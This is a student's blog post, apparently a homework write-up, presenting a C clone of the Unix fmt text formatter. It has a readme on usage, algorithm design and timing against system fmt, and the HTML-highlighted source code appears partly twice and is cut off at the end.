class=\"keyword\">int</span> startblank = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isBlank</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span>&#123;</span><br><span class=\"line\">    return c == <span class=\"string\">' '</span> || c == <span class=\"string\">'\\t'</span> || c == <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isFinish</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span>&#123;</span><br><span class=\"line\">    return c == <span class=\"string\">'.'</span> || c == <span class=\"string\">'?'</span> || c == <span class=\"string\">'!'</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">showhelp</span><span class=\"params\">()</span></span>&#123;<span class=\"comment\">// help info</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\nUsage: fmt [-WIDTH] [OPTION]... [FILE]...\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Format each line in the FILE(s)\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"  -w, --width\\t\\tmaximum line width (default of 75)\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"  -u, --uniform\\t\\tone space between words, two after sentences\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"      --help\\t\\toutput this help and exit\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"      --version\\t\\toutput the version and exit\\n\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Report myfmt bugs to sol315@lehigh.edu\\n\"</span>);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">error</span><span class=\"params\">(<span class=\"keyword\">int</span> id,<span class=\"keyword\">int</span> msg, <span class=\"keyword\">char</span> *file)</span></span>&#123;<span class=\"comment\">//errors</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Error from fmt: \"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (id)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Input file not found\\n\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Input file reading error in file \\\"%s\\\" line %d.\\n\"</span>,file,msg);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"The -w function requires the length of the line bigger than 0\\n\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"Fmt requires input arguments\\n\"</span>);</span><br><span class=\"line\">            showhelp();</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the -w work</span><br><span class=\"line\"> * @param </span><br><span class=\"line\"> *          char *ret: the address of the string that needed to be changed</span><br><span class=\"line\"> *          int len: the length of that string</span><br><span class=\"line\"> * @return  the address of the changed string</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">runw</span><span class=\"params\">(<span class=\"keyword\">char</span> *ret,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN] = &#123;<span class=\"number\">0</span>&#125;;    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> ret_len = <span class=\"number\">0</span>;<span class=\"comment\">//current length of the new string</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> jump = tasks.w_len;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(ret) == <span class=\"number\">1</span>) return ret;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer,ret);<span class=\"comment\">//when this function finished, the \"buffer\" space will gone. So we use buffer to</span></span><br><span class=\"line\">                       <span class=\"comment\">//store the original string, use \"ret\" to store the new string</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(ret,<span class=\"number\">0</span>,FILE_LEN);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(jump &lt;= startblank) jump = startblank + <span class=\"number\">1</span>;<span class=\"comment\">//if the max width smaller than startblank, this line</span></span><br><span class=\"line\">                                                 <span class=\"comment\">//should place one word. We set jump=startblack+1 to do that</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> posi = jump - <span class=\"number\">1</span>,pre = startblank;<span class=\"comment\">//pre means the start position of the new line in the original string. posi means the current pointer position in original string</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(posi &lt; len)&#123;<span class=\"comment\">//this means the process hasn't finished</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(posi &gt; pre &amp;&amp; !isBlank(buffer[posi])) --posi;<span class=\"comment\">//if the max width cuts a word, get the start of the word.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(posi == pre) <span class=\"keyword\">while</span>(!isBlank(buffer[posi])) ++posi;<span class=\"comment\">//if the first single word longer than the max width, get the end of the word.</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(isBlank(buffer[-- posi]));<span class=\"comment\">//if the position of the pointer is in blank, move backward and get the end of this line.</span></span><br><span class=\"line\">        posi ++;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(ret + ret_len, <span class=\"string\">' '</span>, startblank);<span class=\"comment\">//put some blanks in the start of the new line</span></span><br><span class=\"line\">\t\tret_len += startblank;<span class=\"comment\">//get the new length of the new string</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(ret + ret_len, buffer + pre, posi - pre);<span class=\"comment\">//copy the line from the original string to the new one</span></span><br><span class=\"line\">\t\tret_len += posi - pre;</span><br><span class=\"line\">\t\tret[ret_len ++] = <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(isBlank(buffer[posi])) ++posi;<span class=\"comment\">//skip the blanks and get the start of next line</span></span><br><span class=\"line\">        pre = posi;</span><br><span class=\"line\">        posi += jump - startblank - <span class=\"number\">1</span>;<span class=\"comment\">//jump to the next possible cut point</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pre != len) &#123;<span class=\"comment\">//this part is used to handle the last line of the string</span></span><br><span class=\"line\">\t\tposi = len - <span class=\"number\">1</span>;<span class=\"comment\">//the position of the pointer is the end of the string</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(isBlank(buffer[posi])) --posi;<span class=\"comment\">//get the last no-blank char</span></span><br><span class=\"line\">\t\tposi ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(posi != pre) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">memset</span>(ret + ret_len, <span class=\"string\">' '</span>, startblank);</span><br><span class=\"line\">\t\t\tret_len += startblank;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">memcpy</span>(ret + ret_len, buffer + pre, posi - pre);</span><br><span class=\"line\">\t\t\tret_len += posi - pre;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        ret[ret_len ++] = <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">    return ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the -u task</span><br><span class=\"line\"> * @param   buffer: the address of file </span><br><span class=\"line\"> *          len: the length of this file</span><br><span class=\"line\"> * @return  the address of the result string</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">runu</span><span class=\"params\">(<span class=\"keyword\">char</span>* ret,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ret_len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer,ret);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(ret, <span class=\"number\">0</span>, FILE_LEN);<span class=\"comment\">//end of the string</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(ret,<span class=\"string\">' '</span>,startblank);<span class=\"comment\">//put some blanks to the start of the new string</span></span><br><span class=\"line\">\tret_len = startblank;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; len;)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(isFinish(buffer[i])) flag = <span class=\"number\">1</span>;<span class=\"comment\">//if this char means the end of a sentence, set flag true</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!isBlank(buffer[i])) ret[ret_len ++] = buffer[i ++];<span class=\"comment\">//if it is a normal char, copy it </span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;<span class=\"comment\">//if it is a blank char</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(i) ret[ret_len ++] = <span class=\"string\">' '</span>;<span class=\"comment\">//if it isn't the start of the string, put a ' ' in it.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(flag)&#123;</span><br><span class=\"line\">                ret[ret_len ++] = <span class=\"string\">' '</span>;<span class=\"comment\">//if it is the end of a sentence, put another blank in it.</span></span><br><span class=\"line\">                flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(isBlank(buffer[++ i]));<span class=\"comment\">//skip every blanks. using ++ i instead of i ++ can loop 1 time less</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return runw(ret,ret_len);<span class=\"comment\">//every -u needs a -w</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getStartBlank</span><span class=\"params\">(<span class=\"keyword\">char</span> *buffer,<span class=\"keyword\">int</span> len)</span></span>&#123;<span class=\"comment\">//get the number of start blank</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; len;++ i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!isBlank(buffer[i])) </span><br><span class=\"line\">            return i;</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fmt</span><span class=\"params\">(<span class=\"keyword\">char</span> *filename)</span></span>&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[FILE_LEN] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *res;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> linenum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    res = buffer;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">    fp = fopen(filename,<span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"literal\">NULL</span> == fp)&#123;</span><br><span class=\"line\">        error(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        return <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(fgets(buffer,FILE_LEN - <span class=\"number\">2</span>,fp) != <span class=\"literal\">NULL</span>)&#123;<span class=\"comment\">//format the file line by line</span></span><br><span class=\"line\">        len = <span class=\"built_in\">strlen</span>(buffer);</span><br><span class=\"line\">        linenum ++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ferror(fp)) &#123;</span><br><span class=\"line\">            error(<span class=\"number\">2</span>,linenum,filename);</span><br><span class=\"line\">            return <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        startblank = getStartBlank(buffer,len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tasks.u) res = runu(res,len);<span class=\"comment\">//if we do -u, the -w has been done so \"if else if\"</span></span><br><span class=\"line\">\t    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(tasks.w) res = runw(res,len);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>,res);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">showversion</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"version 25\\n\"</span>);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    tasks.w = tasks.u = <span class=\"number\">0</span>;</span><br><span class=\"line\">    tasks.h = tasks.v = <span class=\"number\">0</span>;</span><br><span class=\"line\">    tasks.w_len = <span class=\"number\">75</span>;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">    <span class=\"keyword\">int</span> option_index = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> opt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> optstring[<span class=\"number\">4</span>] = <span class=\"string\">\"uw:\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>** infile;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> file_num = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((opt = getopt_long(argc,argv,optstring,long_options,&amp;option_index)) != <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (opt)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'u'</span>: </span><br><span class=\"line\">                tasks.u = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'w'</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(optarg != <span class=\"literal\">NULL</span>) tasks.w_len = atoi(optarg);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(tasks.w_len &lt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                    error(<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                    return <span class=\"number\">-1</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                tasks.w = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'h'</span>:</span><br><span class=\"line\">                tasks.h = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'v'</span>:</span><br><span class=\"line\">                tasks.v = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc == <span class=\"number\">1</span>) error(<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    infile = argv + optind;<span class=\"comment\">//get the name of input files</span></span><br><span class=\"line\">    file_num = argc - optind;<span class=\"comment\">//get the number of input files</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; file_num;++ i)&#123;</span><br><span class=\"line\">        fmt(infile[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tasks.h) showhelp();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tasks.v) showversion();</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>Author: Song Li</p>\n<p>##AIM##<br>This program is use to do text format things. Users can use this program to limit the width of every line into a particular length and can uniform every blanks.<br>","more":"</p>\n<p>##USAGE##<br>Shown as “–help”, there are two major functions:<br>-u to format the text<br>-w [length] to limit the width of a line into a<br>–h to show the help page<br>–v to show the version info</p>\n<p>##COMPILE##<br>Using</p>\n<blockquote>\n<p>gcc -o fmt.out fmt.c</p>\n</blockquote>\n<p>##FILE STRUCTURE##</p>\n<blockquote>\n<p>fmt.c: the main code of this program<br>inputjane: the inputfile that I use to test the efficiency<br>HW2 fmt readme.pdf: Document of this program</p>\n</blockquote>\n<p>##RESULT##<br>-w [length]: if the original line is longer than the number length, this line will be cut into several lines. After this operation, the maximum length of every line will be the input number “length” and<br>every new line which comes from a same original line will share the same indent just as the original line. They have the same number of leading blanks. And the words will not be separated which means if a word is right at the cut point of the original line, this word will be moved to the next line. So no word will be cut. The default length of every new line is 75.<br>-u: if there are more than one blank characters such as ‘ ’, ”\\t”, some of them will be removed. The result is that between every two words there will be only one blank. After every sentence, which means there are some characters like ‘.’, ‘?’, ‘!’ shown up at the end of a sentence, there will be two blanks. After this action, the length of every line will be limited within 75 characters by default. If users input the maximum length of every line, this limitation will be the input number.</p>\n<p>##INPUT AND OUTPUT##<br>The input text must come from an input file. The result will be output as a “stdout” stream. The<br>input format are exampled here:</p>\n<blockquote>\n<p>./fmt –u –w 50 inputfile1 inputfile2 &gt; outputfile</p>\n</blockquote>\n<p>##ALGORITHM DESIGN##</p>\n<p>###Overall###<br>This program formats texts line by line. In this way, it can handle a very large file in a very small memory cost. It opens the first file, reads a single line into an array, formats it and output it into a particular file and then the next line. After handling a file, it will handle another in the same way.</p>\n<p>###Uniform function###<br>In this function, there are two strings. The first one is the original string. The second string is the new string. There will be two pointers. The first pointer points at the original string, the second one points at the new string. The first pointer, which points at the original string, always keep moving forward.<br>1) When the first pointer points at a normal character, this character will be copied to the new string, and the pointer points at the new string will move forward too.<br>2) When the first pointers points at a blank such as ‘ ’, ‘\\t’, this pointer will keep moving until it points at a normal character which is not a blank character. At the same time, the second pointer will add a blank to the second string. If the last no-blank character is ‘.’, ‘?’ or ‘!’, the second pointer will add two blanks to the second string.<br>After this, the result string will be sent to the –w procession. After the –w procession, we get the final result of this line.</p>\n<p>###Width function###<br>In this function, there also are two strings and two pointers like the uniform function. In order to have a better performance, I designed an algorithm for this function.<br>1) Reset the length limitation to the original limitation minus the number of leading blanks. In this way, we can easily get the real length of characters.<br>2) The original string pointer jumps from the start position of the new line to the expected end position, which is the start position add the length limitation.<br>3)If this position is in the middle of a word, then the first pointer will move backward until the pointer finds a blank character or reaches the new start position.<br>4)If the pointer gets a blank, it will continue move backward to finds a normal character.<br>5) If the pointer reaches the new start position, it will move forward to find the end of this word.<br>6) Using “memcpy” to copy this new line which from the new start position to the end position to the aim string.<br>7) Set the new start to the position of the end position and repeat the steps from 2 to 7.</p>\n<p>###Efficiency###<br>I compared the run time of my program and the system fmt program. The data to test this two programs is a novel called “Jane Eyre”, which contains 21062 lines. Here is the result. (The time is the average time of 10 tests, using linux time function). I’m sure that the system’s fmt is much better than mine. There are lots of things that I didn’t considered like the proper real length, the dictionary and so on.</p>\n<p><img src=\"/image/20151005.jpg\" alt=\"\"></p>\n<p>Here is the code:</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;getopt.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FILE_LEN 10000</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">struct</span> option long_options[] = &#123;</span><br><span class=\"line\">    &#123;<span class=\"string\">\"help\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'h'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"version\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'v'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"uniform\"</span>, no_argument, <span class=\"literal\">NULL</span>, <span class=\"string\">'u'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">\"width\"</span>, required_argument,<span class=\"literal\">NULL</span>, <span class=\"string\">'w'</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"literal\">NULL</span>, no_argument, <span class=\"literal\">NULL</span> ,<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> Task&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> w,u,h,v;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> w_len;</span><br><span class=\"line\">&#125;tasks;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i;</span><br><span class=\"line\"><span class=\"keyword\">int</span> startblank = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isBlank</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span>&#123;</span><br><span class=\"line\">    return c == <span class=\"string\">' '</span> || c == <span class=\"string\">'\\t'</span> || c == <span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isFinish</span><span class=\"params\">(<span class=\"keyword\">char</span> c)</span></span>&#123;</span><br><span class=\"line\">    return c == <span class=\"string\">'.'</span> || c == <span class=\"string\">'?'</span> || c == <span class=\"string\">'!'</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span 